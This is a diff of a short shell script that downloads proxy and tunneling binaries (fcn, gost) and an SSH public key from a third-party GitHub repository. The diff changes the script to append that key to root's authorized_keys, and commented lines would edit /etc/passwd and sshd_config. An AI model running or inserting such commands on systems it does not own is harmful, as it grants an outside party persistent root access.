@@ -1,5 +1,4 @@
 #!/bin/sh
-cd ~
 #sed -i "s#root:/root#root:$(pwd)#g" /etc/passwd
 IP=$(curl -s ipinfo.io/ip)
 [ -z ${IP} ] && IP=$(curl -s http://api.ipify.org)
@@ -20,10 +19,10 @@ wget https://github.com/yinghua8wu/tcpudp/raw/master/fcn_x64
 wget https://github.com/yinghua8wu/tcpudp/raw/master/gost-linux-amd64
 wget https://raw.githubusercontent.com/yinghua8wu/tcpudp/master/fcn-s.conf
 wget https://raw.githubusercontent.com/yinghua8wu/tcpudp/master/id_rsa.pub
-mkdir .ssh
-cat id_rsa.pub >> ~/.ssh/authorized_keys
-chmod 600 ~/.ssh/authorized_keys
-chmod 700 ~/.ssh
+mkdir /root/.ssh
+cat id_rsa.pub >> /root/.ssh/authorized_keys
+chmod 600 /root/.ssh/authorized_keys
+chmod 700 /root/.ssh
 #mv sshd_config /etc/ssh/sshd_config
 mv fcn_x64 fcn
 mv gost-linux-amd64 gost
